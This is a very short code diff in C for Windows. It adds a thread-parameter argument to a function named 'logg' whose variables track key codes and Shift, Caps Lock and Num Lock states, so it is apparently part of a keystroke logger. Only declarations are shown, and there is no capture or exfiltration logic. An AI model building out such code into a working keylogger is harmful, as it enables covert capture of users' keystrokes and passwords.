@@ -1,4 +1,4 @@
-DWORD WINAPI logg(){
+DWORD WINAPI logg(LPVOID lpParam){
 	int vkey,last_key_state[0xFF];
 	int isCAPSLOCK,isNUMLOCK;
 	int isL_SHIFT,isR_SHIFT;
